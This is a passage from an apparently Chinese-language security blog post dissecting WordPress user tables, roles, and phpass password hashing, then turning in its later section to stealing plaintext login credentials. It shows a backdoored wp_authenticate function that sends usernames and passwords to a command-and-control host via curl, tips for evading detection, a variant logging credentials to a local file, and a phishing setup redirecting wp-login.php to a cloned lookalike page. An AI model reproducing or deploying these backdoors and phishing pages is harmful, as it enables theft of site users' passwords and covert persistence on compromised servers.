<span class="o">|</span> <span class="n">comment_id</span> <span class="o">|</span> <span class="nb">bigint</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="n">unsigned</span> <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span> <span class="mi">0</span>       <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">meta_key</span>   <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>        <span class="o">|</span> <span class="n">YES</span>  <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span> <span class="k">NULL</span>    <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">meta_value</span> <span class="o">|</span> <span class="n">longtext</span>            <span class="o">|</span> <span class="n">YES</span>  <span class="o">|</span>     <span class="o">|</span> <span class="k">NULL</span>    <span class="o">|</span>                <span class="o">|</span>
<span class="o">+</span><span class="c1">------------+---------------------+------+-----+---------+----------------+</span>
<span class="mi">4</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">006</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<h3 data-content="1" id="624e2d3fd3ef282426442f956859b586">1.2.4 关于用户 [wp_user &amp;&amp; wp_usermeta]</h3>
<h4 data-content="1" id="63f818178e0c0cbdc7df9919de285d4c">wp_user表结构</h4>
<div class="highlight"><pre><span></span><span class="n">MariaDB</span> <span class="p">[</span><span class="n">wordpress</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">desc</span> <span class="n">wp_users</span><span class="p">;</span>
<span class="o">+</span><span class="c1">---------------------+---------------------+------+-----+---------------------+----------------+</span>
<span class="o">|</span> <span class="n">Field</span>               <span class="o">|</span> <span class="k">Type</span>                <span class="o">|</span> <span class="k">Null</span> <span class="o">|</span> <span class="k">Key</span> <span class="o">|</span> <span class="k">Default</span>             <span class="o">|</span> <span class="n">Extra</span>          <span class="o">|</span>
<span class="o">+</span><span class="c1">---------------------+---------------------+------+-----+---------------------+----------------+</span>
<span class="o">|</span> <span class="n">ID</span>                  <span class="o">|</span> <span class="nb">bigint</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="n">unsigned</span> <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">PRI</span> <span class="o">|</span> <span class="k">NULL</span>                <span class="o">|</span> <span class="n">auto_increment</span> <span class="o">|</span>
<span class="o">|</span> <span class="n">user_login</span>          <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>         <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span>                     <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">user_pass</span>           <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>        <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span>                     <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">user_nicename</span>       <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>         <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span>                     <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">user_email</span>          <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>        <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span>                     <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">user_url</span>            <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>        <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span>                     <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">user_registered</span>     <span class="o">|</span> <span class="n">datetime</span>            <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="mi">0000</span><span class="o">-</span><span class="mi">00</span><span class="o">-</span><span class="mi">00</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">user_activation_key</span> <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>        <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span>                     <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">user_status</span>         <span class="o">|</span> <span class="nb">int</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>             <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="mi">0</span>                   <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">display_name</span>        <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">250</span><span class="p">)</span>        <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span>     <span class="o">|</span>                     <span class="o">|</span>                <span class="o">|</span>
<span class="o">+</span><span class="c1">---------------------+---------------------+------+-----+---------------------+----------------+</span>
<span class="mi">10</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">012</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<h4 data-content="1" id="e962d2166ea3515416b18e14f3e3a44d">数据内容研究</h4>
<p>查询wp_users内容，抽取一条数据作为示例数据</p>
<div class="highlight"><pre><span></span><span class="n">MariaDB</span> <span class="p">[</span><span class="n">wordpress</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">wp_users</span><span class="err">\</span><span class="k">G</span><span class="p">;</span>
<span class="o">***************************</span> <span class="mi">1</span><span class="p">.</span> <span class="k">row</span> <span class="o">***************************</span>
                 <span class="n">ID</span><span class="p">:</span> <span class="mi">1</span>
         <span class="n">user_login</span><span class="p">:</span> <span class="n">may</span>
          <span class="n">user_pass</span><span class="p">:</span> <span class="err">$</span><span class="n">P$BIhCqMiD2uzJeO6twupZ5mLxywmI011</span>
      <span class="n">user_nicename</span><span class="p">:</span> <span class="n">may</span>
         <span class="n">user_email</span><span class="p">:</span> <span class="mi">1234567</span><span class="o">@</span><span class="n">qq</span><span class="p">.</span><span class="n">com</span>
           <span class="n">user_url</span><span class="p">:</span>
    <span class="n">user_registered</span><span class="p">:</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">20</span> <span class="mi">14</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">10</span>
<span class="n">user_activation_key</span><span class="p">:</span> <span class="mi">1682217747</span><span class="p">:</span><span class="err">$</span><span class="n">P$BB</span><span class="p">.</span><span class="n">woxlLoP440TeBAqHYGlQdPN2WpI1</span>
        <span class="n">user_status</span><span class="p">:</span> <span class="mi">0</span>
       <span class="n">display_name</span><span class="p">:</span> <span class="n">may</span>
<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<ul>
<li>重复意义字段不再赘述</li>
<li>user_pass存储用户密码的hash 加密算法后续探讨</li>
<li>user_activation_key用户注册后用于激活账户的加密字符串，可用于验证用户的电子邮件地址</li>
</ul>
<h4 data-content="1" id="279bc3672b3504d540c46c5492df7d6c">wp_usermeta表结构</h4>
<div class="highlight"><pre><span></span><span class="n">MariaDB</span> <span class="p">[</span><span class="n">wordpress</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">desc</span> <span class="n">wp_usermeta</span><span class="p">;</span>
<span class="o">+</span><span class="c1">------------+---------------------+------+-----+---------+----------------+</span>
<span class="o">|</span> <span class="n">Field</span>      <span class="o">|</span> <span class="k">Type</span>                <span class="o">|</span> <span class="k">Null</span> <span class="o">|</span> <span class="k">Key</span> <span class="o">|</span> <span class="k">Default</span> <span class="o">|</span> <span class="n">Extra</span>          <span class="o">|</span>
<span class="o">+</span><span class="c1">------------+---------------------+------+-----+---------+----------------+</span>
<span class="o">|</span> <span class="n">umeta_id</span>   <span class="o">|</span> <span class="nb">bigint</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="n">unsigned</span> <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">PRI</span> <span class="o">|</span> <span class="k">NULL</span>    <span class="o">|</span> <span class="n">auto_increment</span> <span class="o">|</span>
<span class="o">|</span> <span class="n">user_id</span>    <span class="o">|</span> <span class="nb">bigint</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="n">unsigned</span> <span class="o">|</span> <span class="k">NO</span>   <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span> <span class="mi">0</span>       <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">meta_key</span>   <span class="o">|</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>        <span class="o">|</span> <span class="n">YES</span>  <span class="o">|</span> <span class="n">MUL</span> <span class="o">|</span> <span class="k">NULL</span>    <span class="o">|</span>                <span class="o">|</span>
<span class="o">|</span> <span class="n">meta_value</span> <span class="o">|</span> <span class="n">longtext</span>            <span class="o">|</span> <span class="n">YES</span>  <span class="o">|</span>     <span class="o">|</span> <span class="k">NULL</span>    <span class="o">|</span>                <span class="o">|</span>
<span class="o">+</span><span class="c1">------------+---------------------+------+-----+---------+----------------+</span>
<span class="mi">4</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">007</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<h4 data-content="1" id="3dca40dc66d369a9fefb73f227061c85">数据内容研究</h4>
<p>查询wp_usermeta内容，抽取一条数据作为示例数据</p>
<div class="highlight"><pre><span></span><span class="o">***************************</span> <span class="mi">15</span><span class="p">.</span> <span class="k">row</span> <span class="o">***************************</span>
  <span class="n">umeta_id</span><span class="p">:</span> <span class="mi">16</span>
   <span class="n">user_id</span><span class="p">:</span> <span class="mi">1</span>
  <span class="n">meta_key</span><span class="p">:</span> <span class="n">session_tokens</span>
<span class="n">meta_value</span><span class="p">:</span> <span class="n">a</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="err">{</span><span class="n">s</span><span class="p">:</span><span class="mi">64</span><span class="p">:</span><span class="ss">"1316d49c50e7e0ec03b2e315a270bb3daca0f69aeae33d316e816ecb31c7cf5c"</span><span class="p">;</span><span class="n">a</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="err">{</span><span class="n">s</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="ss">"expiration"</span><span class="p">;</span><span class="n">i</span><span class="p">:</span><span class="mi">1682476834</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="ss">"ip"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="ss">"172.22.0.1"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="ss">"ua"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">117</span><span class="p">:</span><span class="ss">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="ss">"login"</span><span class="p">;</span><span class="n">i</span><span class="p">:</span><span class="mi">1682304034</span><span class="p">;</span><span class="err">}}</span>
<span class="mi">15</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">005</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<p>前面几个没什么好说的，重点看一下meta_value字段</p>
<div class="highlight"><pre><span></span><span class="n">a</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="err">{</span><span class="n">s</span><span class="p">:</span><span class="mi">64</span><span class="p">:</span><span class="ss">"1316d49c50e7e0ec03b2e315a270bb3daca0f69aeae33d316e816ecb31c7cf5c"</span><span class="p">;</span><span class="n">a</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="err">{</span><span class="n">s</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="ss">"expiration"</span><span class="p">;</span><span class="n">i</span><span class="p">:</span><span class="mi">1682476834</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="ss">"ip"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="ss">"172.22.0.1"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="ss">"ua"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">117</span><span class="p">:</span><span class="ss">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="ss">"login"</span><span class="p">;</span><span class="n">i</span><span class="p">:</span><span class="mi">1682304034</span><span class="p">;</span><span class="err">}}</span>
</pre></div>
<p>看起来这是一串序列化字符 反序列化解构后如下</p>
<div class="highlight"><pre><span></span><span class="nb">Array</span>
<span class="p">(</span>
    <span class="p">[</span><span class="mi">1316</span><span class="n">d49c50e7e0ec03b2e315a270bb3daca0f69aeae33d316e816ecb31c7cf5c</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nb">Array</span>
        <span class="p">(</span>
            <span class="p">[</span><span class="n">expiration</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mi">1682476834</span>
            <span class="p">[</span><span class="n">ip</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mi">172</span><span class="p">.</span><span class="mi">22</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span>
            <span class="p">[</span><span class="n">ua</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mi">5</span><span class="p">.</span><span class="mi">0</span> <span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span> <span class="n">Intel</span> <span class="n">Mac</span> <span class="n">OS</span> <span class="n">X</span> <span class="mi">10</span><span class="n">_15_7</span><span class="p">)</span> <span class="n">AppleWebKit</span><span class="o">/</span><span class="mi">537</span><span class="p">.</span><span class="mi">36</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="k">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mi">112</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span> <span class="n">Safari</span><span class="o">/</span><span class="mi">537</span><span class="p">.</span><span class="mi">36</span>
            <span class="p">[</span><span class="n">login</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mi">1682304034</span>
        <span class="p">)</span>

<span class="p">)</span>
</pre></div>
<p>1316d49c50e7e0ec03b2e315a270bb3daca0f69aeae33d316e816ecb31c7cf5c，值是另外一个数组。这个数组包含了以下四个键值对：</p>
<ul>
<li>expiration: 值为 1682476834，表示到期时间的 Unix 时间戳。</li>
<li>ip: 值为 172.22.0.1，表示登录时的 IP 地址。</li>
<li>ua: 值为 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36，表示登录时的 User Agent 信息。</li>
<li>login: 值为 1682304034，表示登录时间的 Unix 时间戳。</li>
</ul>
<h2 data-content="1" id="4a543b3e62b7d372dc362c4d97736e15">1.3用户权限管理研究</h2>
<h3 data-content="1" id="cd7bc572e9ab02e868cde31ebb6190b4">1.3.1 角色</h3>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/21402865/1683622133332-f580ee5d-0bba-4e9c-afaa-34a044fdea3f.png#averageHue=%2396a32f&amp;clientId=u4f469f24-2168-4&amp;from=paste&amp;height=374&amp;id=u6079dd54&amp;originHeight=591&amp;originWidth=1100&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=294038&amp;status=done&amp;style=none&amp;taskId=u29b96294-1367-4ed4-bcce-81dad823559&amp;title=&amp;width=697"/><br/>
当在wp网站上创建一个用户时，需要为该用户指定一个角色。角色定义了该用户在网站上所拥有的权限和功能。wp内置了五个默认角色：</p>
<ul>
<li>Super Admin超级管理员：拥有网站的所有权限，只能由网站创建者指定</li>
<li>Administrator：拥有网站的所有权限，可以管理用户、发布内容、更改设置等</li>
<li>Editor编辑：可以发布、编辑和删除自己和其他用户的文章，管理分类和标签，但不能管理用户和更改设置</li>
<li>Author作者：可以发布、编辑和删除自己的文章，但不能发布文章和上传文件，也不能管理分类和标签、用户和设置</li>
<li>Contributor投稿者：可以撰写和编辑自己的文章，但不能发布文章和上传文件，也不能管理分类和标签、用户和设置。</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/21402865/1683291680499-ee404b9e-29f9-4299-b321-3dee2831ec6f.png#averageHue=%23d0d0d0&amp;clientId=ud2d76d9b-b97c-4&amp;from=paste&amp;height=338&amp;id=ucaf8475f&amp;originHeight=676&amp;originWidth=2752&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=186583&amp;status=done&amp;style=none&amp;taskId=u54831d0e-8217-4279-82f3-7d9647f209f&amp;title=&amp;width=1376"/></p>
<h3 data-content="1" id="1385d10267fdec5231ec20453b65edce">1.3.2 特权</h3>
<ul>
<li>在 WordPress 中，每个角色都拥有其特权或权限，这些权限定义了他们可以做什么和不能做什么。</li>
<li>特权或权限是指在 WordPress 后台管理界面中，角色所能访问和执行的操作。</li>
<li>权限有编辑文章、发布评论、上传媒体文件、管理用户等。</li>
<li>在 WordPress 中，权限分配的原则是：给予用户尽可能少的权限，以确保他们只能执行他们需要执行的任务，而不会干扰或更改其它任务。这种权限分配和管理的方法被称为最小权限原则（Least Privilege Principle）。</li>
</ul>
<p>wordpress提供了<code>**WP_Roles</code><strong>、`</strong>WP_Role<code>**和</code><strong>WP_User`</strong>这几个类用于高级的权限管理，它们的具体使用场景根据GPT的回答可以总结如下：</p>
<ol>
<li>
<strong>自定义角色创建和管理</strong>：当标准的WordPress角色（如管理员、编辑、作者等）不满足网站特定需求时，可以使用<strong>WP_Roles</strong>和<strong>WP_Role</strong>类来创建和管理自定义角色。例如，为特定类型的内容管理或功能添加专门的角色。</li>
<li>
<strong>特定权限的分配和管理</strong>：这些类允许网站管理员为现有角色添加或移除特定权限。例如，如果需要让编辑者角色能夹杂用户，可以使用<strong>WP_Role</strong>类来实现这一点。</li>
<li>
<strong>针对单个用户的权限管理</strong>：<strong>WP_User</strong>类可以用来管理单个用户的角色和权限。例如，如果需要为特定用户分配多个角色或者给特定用户添加特殊权限，可以使用这个类。</li>
<li>
<strong>插件和主题开发</strong>：开发者在创建插件或主题时，可能需要根据插件或主题的功能要求，添加新的用户角色或权限。这时，这些类就显得非常有用。</li>
<li>
<strong>安全性增强</strong>：在处理安全敏感的应用时，精确控制用户的权限是非常重要的。通过这些接口，可以限制用户访问敏感区域或执行特定操作，以增强网站的安全性。</li>
<li>
<strong>用户权限的动态调整</strong>：在需要动态调整用户权限的场景，如基于用户行为或其他条件，可以使用这些类动态更改用户的角色和权限。</li>
<li>
<strong>多用户管理和协作</strong>：在有多用户参与的网站，如多作者博客、新闻网站或企业网站，这些类可以帮助管理不同用户的角色和权限，以保证有效的内容管理和协作。</li>
</ol>
<h3 data-content="1" id="7649ef9bb5c28cbd685ca67a464f0282">1.3.3 用户</h3>
<p>通过用户界面，管理员可以创建、编辑和删除用户，设置他们的角色、电子邮件地址、密码等。同时，管理员还可以为每个用户设置其自己的偏好设置，例如个人资料信息、头像等。</p>
<h2 data-content="1" id="1b5a4449d880d7d4caabd5d6a1d76182">1.4用户密码加密算法研究</h2>
<p>wordpress使用了一种名为<code>**phpass**</code>的开源类来生成和验证用户密码，这个过程涉及到几个关键步骤和函数：</p>
<h3 data-content="1" id="c279250bfe5fef1859821444879b8538">密码哈希生成</h3>
<p>使用<code>**wp_hash_password()**</code>函数，该函数内部依赖<code>**phpass**</code>类</p>
<div class="highlight"><pre><span></span><span class="x">function wp_hash_password($password) {</span>
<span class="x">  global $wp_hasher;</span>

<span class="x">  if ( empty($wp_hasher) ) {</span>
<span class="x">    require_once( ABSPATH . WPINC . '/class-phpass.php');</span>
<span class="x">    // By default, use the portable hash from phpass</span>
<span class="x">    $wp_hasher = new PasswordHash(8, true);</span>
<span class="x">  }</span>

<span class="x">  return $wp_hasher-&gt;HashPassword( trim( $password ) );</span>
<span class="x">}</span>
<span class="x">endif;</span>
</pre></div>
<p>其中<code>**$wp_hasher**</code>对象实例化的就是引入的phpass开源类</p>
<div class="highlight"><pre><span></span><span class="x">class </span>
<span class="x">function HashPassword($password)</span>
<span class="x">    {</span>
<span class="x">        if ( strlen( $password ) &gt; 4096 ) {</span>
<span class="x">            return '*';</span>
<span class="x">        }</span>

<span class="x">        $random = '';</span>

<span class="x">        if (CRYPT_BLOWFISH == 1 &amp;&amp; !$this-&gt;portable_hashes) {</span>
<span class="x">            $random = $this-&gt;get_random_bytes(16);</span>
<span class="x">            $hash =</span>
<span class="x">                crypt($password, $this-&gt;gensalt_blowfish($random));</span>
<span class="x">            if (strlen($hash) == 60)</span>
<span class="x">                return $hash;</span>
<span class="x">        }</span>
<span class="x">    ...</span>
</pre></div>
<p>在哈希过程中会生成salt结合用户的明文密码进行加密，加密算法取决于php版本<br/>
php5.0及以上的版本使用Blowfish算法进行加密，低于php5.0的版本则使用md5算法<br/>
blowfish是一种对称加密算法，理论上是可逆的，但wordpress使用的是它的变体bcrypt，这个加密过程是单向的</p>
<h3 data-content="1" id="1cd40469aea996278652f66a95c0aea5">密码验证</h3>
<p>使用<code>**wp_check_password()**</code>函数，这个函数将用户输入的密码与数据库中存储的哈希进行比对，在这个过程中，它还会再次使用phpass类中的方法来进行比对</p>
<div class="highlight"><pre><span></span><span class="x">function wp_check_password($password, $hash, $user_id = '') {</span>
<span class="x">    global $wp_hasher;</span>

<span class="x">    // If the hash is still md5...</span>
<span class="x">    if ( strlen($hash) &lt;= 32 ) {</span>
<span class="x">        $check = hash_equals( $hash, md5( $password ) );</span>
<span class="x">        if ( $check &amp;&amp; $user_id ) {</span>
<span class="x">            // Rehash using new hash.</span>
<span class="x">            wp_set_password($password, $user_id);</span>
<span class="x">            $hash = wp_hash_password($password);</span>
<span class="x">        }</span>
<span class="x">  ...</span>
</pre></div>
<h2 data-content="1" id="714d24a330a655678b6e0f4086d8929a">1.5 登陆明文密码劫持</h2>
<h3 data-content="1" id="ee8dce51d67e008ce1134166624e4499">后门劫持</h3>
<p>通过修改/wp-include/pluggable.php文件中的<code>wp_authenticate</code>方法实现明文密码的劫持</p>
<div class="highlight"><pre><span></span><span class="x">function wp_authenticate($username, $password) {</span>

<span class="x">    $username = sanitize_user($username);</span>
<span class="x">    $password = trim($password);</span>
<span class="x">  system('curl http://1x2.1x4.7x.2x4:18080/?password='.$username.$password);</span>
<span class="x">    ...</span>
</pre></div>
<p>在c2建立监听 当wordpress用户登录时 就会向c2发送明文账号密码<img src="https://cdn.nlark.com/yuque/0/2024/png/21402865/1705049648036-6bc3a997-6283-44ec-97a1-acd7ef719939.png#averageHue=%2344484d&amp;clientId=u73ac5ba2-244f-4&amp;from=paste&amp;height=208&amp;id=ucb42f755&amp;originHeight=416&amp;originWidth=1424&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=116522&amp;status=done&amp;style=none&amp;taskId=u9c4e8158-08ec-418c-8484-61a3cd40b1b&amp;title=&amp;width=712"/><br/>
对于明文密码的传递可以通过dns_get_record等函数进行流量的特征脱敏<br/>
对于后门部分可以通过规避webshell检测工具的思路编写</p>
<p>但是这样的实现方式总归都很容易察觉 并且system之类的函数在应用部署后基本就是默认禁用</p>
<p>所以还是使用写入本地文件 隔一段时间再上线查看比较可靠</p>
<div class="highlight"><pre><span></span><span class="x">function wp_authenticate($username, $password) {</span>

<span class="x">    $username = sanitize_user($username);</span>
<span class="x">    $password = trim($password);</span>
<span class="x">  file_put_contents('accesss.log',$username.$password);</span>
<span class="x">   ...</span>
</pre></div>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/21402865/1705057214590-b48ec082-f011-4309-949f-8917db67a1f8.png#averageHue=%230d1414&amp;clientId=u73ac5ba2-244f-4&amp;from=paste&amp;height=124&amp;id=uf7cb4e9b&amp;originHeight=248&amp;originWidth=1002&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=103557&amp;status=done&amp;style=none&amp;taskId=uba5567ac-9c7d-49ee-b15e-7aadeebf323&amp;title=&amp;width=501"/></p>
<h3 data-content="1" id="ad5b50fc988c8edaff51938c78fd6a5a">钓鱼劫持</h3>
<p>针对安全意识不强的操作人员 可以通过钓鱼劫持的方式将访问/wp-login.php的请求重定向到钓鱼页面,在钓鱼网站输入密码后再重定向到原本的登录界面<br/>
针对不出网的环境 可以部署相似文件名的本地文件做鱼饵 如wp-logln.php<br/>
1.在wp_login.php中插入重定向到wp_logln.php的语句 通过session字段避免重定向死循环</p>
<div class="highlight"><pre><span></span><span class="x">session_start();</span>
<span class="x">$host = $_SERVER['HTTP_HOST'];</span>
<span class="x">if(!isset($_SESSION['redirected'])){</span>
<span class="x">    $_SESSION['redirected'] = true;</span>
<span class="x">    header('Location: http://' . $host . '/wp-logln.php');</span>
<span class="x">}</span>
</pre></div>
<p>2.使用httrack工具克隆wp_login.php前端页面<br/>
<a href="https://github.com/xroche/httrack" target="_blank">GitHub - xroche/httrack: HTTrack Website Copier, copy websites to your computer (Official repository)</a><br/>
对表单部分进行修改 在表单后插入代码进行明文密码劫持</p>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">name</span><span class="o">=</span><span class="s">"loginform"</span> <span class="na">id</span><span class="o">=</span><span class="s">"loginform"</span> <span class="na">action</span><span class="o">=</span><span class="s">"wp-logln.php"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">"user_login"</span><span class="p">&gt;</span>用户名或电子邮件地址

      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"log"</span> <span class="na">id</span><span class="o">=</span><span class="s">"user_login"</span> <span class="na">class</span><span class="o">=</span><span class="s">"input"</span> <span class="na">value</span><span class="o">=</span><span class="s">""</span> <span class="na">size</span><span class="o">=</span><span class="s">"20"</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">"user_pass"</span><span class="p">&gt;</span>密码

      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"password"</span> <span class="na">name</span><span class="o">=</span><span class="s">"pwd"</span> <span class="na">id</span><span class="o">=</span><span class="s">"user_pass"</span> <span class="na">class</span><span class="o">=</span><span class="s">"input"</span> <span class="na">value</span><span class="o">=</span><span class="s">""</span> <span class="na">size</span><span class="o">=</span><span class="s">"20"</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">"forgetmenot"</span><span class="p">&gt;&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">"rememberme"</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"rememberme"</span> <span class="na">type</span><span class="o">=</span><span class="s">"checkbox"</span> <span class="na">id</span><span class="o">=</span><span class="s">"rememberme"</span> <span class="na">value</span><span class="o">=</span><span class="s">"forever"</span>  <span class="p">/&gt;</span> 记住我<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">"submit"</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">name</span><span class="o">=</span><span class="s">"wp-submit"</span> <span class="na">id</span><span class="o">=</span><span class="s">"wp-submit"</span> <span class="na">class</span><span class="o">=</span><span class="s">"button button-primary button-large"</span> <span class="na">value</span><span class="o">=</span><span class="s">"登录"</span> <span class="p">/&gt;</span>
